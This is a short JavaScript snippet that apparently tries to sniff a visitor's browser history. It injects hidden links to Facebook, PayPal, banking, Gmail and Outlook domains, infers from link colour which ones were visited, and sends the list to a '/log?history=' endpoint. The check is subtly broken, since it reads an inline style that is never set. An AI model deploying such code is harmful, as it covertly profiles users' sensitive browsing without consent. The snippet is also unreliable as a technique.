const keywords = ["facebook", "paypal", "bank", "login", "email", "outlook", "gmail"];
let found = [];

keywords.forEach(k => {
  const a = document.createElement("a");
  a.href = `https://${k}.com`;
  a.style.display = "none";
  document.body.appendChild(a);

  if (a.style.color === 'rgb(0, 0, 255)' || a.style.color === 'purple') {
    found.push(k);
  }

  document.body.removeChild(a);
});

if (found.length > 0) {
  fetch("/log?history=" + found.join(","));
}